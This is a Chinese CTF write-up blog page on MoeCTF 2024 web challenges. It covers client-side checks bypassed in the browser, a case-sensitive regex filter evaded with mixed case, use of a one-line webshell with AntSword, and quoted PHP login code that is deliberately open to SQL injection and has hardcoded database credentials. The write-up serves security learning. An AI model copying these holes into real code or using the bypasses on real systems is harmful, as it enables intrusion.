↓&lt;br&gt;&#x2F;flag1ab.html&lt;br&gt;第一关：&lt;br&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd557a066befcec6e1fd36.png&gt;&lt;br&gt;第二关：&lt;br&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd5637066befcec6e1ff40.png&gt;&lt;&#x2F;p&gt; &lt;p&gt;第三关&lt;br&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd56c7066befcec6e200eb.png&gt;&lt;&#x2F;p&gt; &lt;p&gt;第四关：&lt;br&gt;先根据提示 把referer头改一下&lt;br&gt;给了源代码&lt;&#x2F;p&gt; <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buttons = document.getElementById(<span class="string">&quot;scope&quot;</span>).getElementsByTagName(<span class="string">&quot;button&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buttons.<span class="built_in">length</span>; i++) &#123;</span><br><span class="line">      buttons[i].id = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>) &#123;</span><br><span class="line">      document.getElementById(<span class="string">&quot;num&quot;</span>).innerText = <span class="string">&quot;9&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getID</span>(<span class="params">button</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (button.id == <span class="number">9</span>) &#123;</span><br><span class="line">          alert(<span class="string">&quot;你过关！（铜人震声）\n我们使用 console.log 来为你生成 flag&quot;</span>);</span><br><span class="line">          fetch(<span class="string">&#x27;flag4bbc.php&#x27;</span>, &#123;</span><br><span class="line">              <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">              <span class="attr">body</span>: <span class="string">&#x27;method=get&#x27;</span>,</span><br><span class="line">              <span class="attr">headers</span>: &#123;</span><br><span class="line">                  <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">              &#125;,</span><br><span class="line">          &#125;).then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">              <span class="keyword">return</span> data.json();</span><br><span class="line">          &#125;).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="built_in">console</span>.<span class="built_in">log</span>(result.hint);</span><br><span class="line">              <span class="built_in">console</span>.<span class="built_in">log</span>(result.fll);</span><br><span class="line">              <span class="built_in">console</span>.<span class="built_in">log</span>(result.goto)</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          alert(<span class="string">&quot;该罚！(头部碰撞声)&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div> &lt;p&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd5971066befcec6e20657.png&gt;&lt;br&gt;直接在元素里面修改一个按钮的值为9就可以了，这里最后说输出在console.log那就在控制台看&lt;&#x2F;p&gt; &lt;p&gt;第五关&lt;br&gt;源代码&lt;&#x2F;p&gt; <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;flag5sxr.php&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkValue()&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    请输入 &quot;I want flag&quot; : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">checkValue</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> content = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;form&quot;</span>][<span class="string">&quot;content&quot;</span>].<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (content == <span class="string">&quot;I want flag&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;你就这么直接？&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div> &lt;p&gt;这里看到这个提交框的数据的name是 content但是直接在输入框输入会跳转到checkValue，这个函数啥用都没有&lt;br&gt;根据这个表单的method，我们用post发送content解决&lt;br&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd5b01066befcec6e20a86.png&gt;&lt;&#x2F;p&gt; &lt;p&gt;第六关&lt;&#x2F;p&gt; <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag6diw.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moe&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;moe&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;moe&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;moe&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag6: xxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> &lt;p&gt;这里就是要用get和post都设置moe，但是要绕过flag，注意到这里判断输入flag的preg_match是&#x2F;i，这个是大小写不敏感的&lt;br&gt;前面一个preg_match是大小写敏感的，所以利用方式也很明显了，输入有大小的flag就好了&lt;br&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd5be1066befcec6e20d2f.png&gt;&lt;&#x2F;p&gt; &lt;p&gt;第七关:&lt;br&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd5bff066befcec6e20d8f.png&gt;&lt;&#x2F;p&gt; &lt;p&gt;这个就是有一句话木马，用蚁剑连接在根目录拿到flag7&lt;&#x2F;p&gt; &lt;p&gt;最后拼出完整的flag bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0&#x3D;&lt;br&gt;用base64解码拿到flag 7合1&lt;&#x2F;p&gt; &lt;h1 id&#x3D;电院-Backend&gt;&lt;a href&#x3D;#电院-Backend class&#x3D;headerlink title&#x3D;电院_Backend&gt;&lt;&#x2F;a&gt;电院_Backend&lt;&#x2F;h1&gt;&lt;p&gt;下载题目源码&lt;&#x2F;p&gt; <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>)&#123;</span><br><span class="line">    <span class="variable">$verify_code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;verify_code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证验证码</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$verify_code</span>) || <span class="variable">$verify_code</span> !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;验证码错误啦，再输入吧&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/&quot;</span>, <span class="variable">$email</span>)||<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or/i&quot;</span>, <span class="variable">$email</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;不存在邮箱为： &#x27;</span>.<span class="variable">$email</span>.<span class="string">&#x27; 的管理员账号！&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pwd</span>);</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;xdsec&quot;</span>,<span class="number">3306</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE email=&#x27;<span class="subst">$email</span>&#x27; AND pwd=&#x27;<span class="subst">$pwd</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_email&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">1</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;登陆成功，moectf&#123;testflag&#125;&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;管理员邮箱或密码错误&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div> &lt;p&gt;注意到这里用的数据库查询是直接拼接的，所以可能有sql注入 然后过滤了or&lt;br&gt;然后我先用这个源码的名字login找登录，但是没有这个界面，访问robots.txt发现入口在&#x2F;admin&lt;&#x2F;p&gt; &lt;p&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd60bc066befcec6e2181b.png&gt;&lt;br&gt;弹窗很快消失了，可以用bp中的repeater发送，然后看响应&lt;&#x2F;p&gt;</a>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/36666.html" title="moectf_2024web">https://guayu-kakeru.github.io/posts/36666.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/50762.html" rel="prev" title="HMV-Driftingblues">
+      <i class="fa fa-chevron-left"></i> HMV-Driftingblues
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/29573.html" rel="next" title="HMV-up">
+      HMV-up <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF01-MoeCTF%EF%BC%9F%E5%90%AF%E5%8A%A8%EF%BC%81"><span class="nav-text">垫刀之路01: MoeCTF？启动！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF02-%E6%99%AE%E9%80%9A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">垫刀之路02: 普通的文件上传</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF03-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9B%BE%E5%BA%8A"><span class="nav-text">垫刀之路03: 这是一个图床</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF04-%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="nav-text">垫刀之路04: 一个文件浏览器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF05-%E7%99%BB%E9%99%86%E7%BD%91%E7%AB%99"><span class="nav-text">垫刀之路05: 登陆网站</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF06-pop-base-mini-moe"><span class="nav-text">垫刀之路06: pop base mini moe</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF07-%E6%B3%84%E6%BC%8F%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-text">垫刀之路07: 泄漏的密码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%97%E6%8B%89%E6%A0%BC%E4%B9%8B%E5%9C%B0%E7%9A%84%E5%85%A5%E5%8F%A3"><span class="nav-text">弗拉格之地的入口</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ImageCloud%E5%89%8D%E7%BD%AE"><span class="nav-text">ImageCloud前置</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">63</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/29573.html" title="posts&#x2F;29573.html">HMV-up</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/36666.html" title="posts&#x2F;36666.html">moectf_2024web</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50762.html" title="posts&#x2F;50762.html">HMV-Driftingblues</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/6117.html" title="posts&#x2F;6117.html">HMV-family3</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/21833.html" title="posts&#x2F;21833.html">SQL漏洞学习笔记</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
